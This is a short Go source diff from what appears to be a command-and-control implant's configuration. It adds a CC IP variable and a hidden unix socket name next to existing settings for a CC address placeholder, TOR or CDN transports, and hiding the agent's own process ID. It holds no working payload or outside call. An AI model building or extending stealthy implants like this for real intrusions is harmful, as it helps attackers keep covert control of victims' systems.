@@ -14,6 +14,9 @@ var (
 	// CCAddress how our agent finds its CC
 	CCAddress = "https://[cc_ipaddr]"
 
+	// CCIP IP address of CC
+	CCIP = ""
+
 	// Transport what transport is this agent using? (HTTP2 / CDN / TOR)
 	Transport = "HTTP2"
 
@@ -31,6 +34,9 @@ var (
 
 	// AgentProxy used by this agent to communicate with CC server
 	AgentProxy = ""
+
+	// SocketName name of our unix socket
+	SocketName = AgentRoot + "/.s6Y4tDtahIuL"
 
 	// HIDE_PIDS all the processes
 	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}
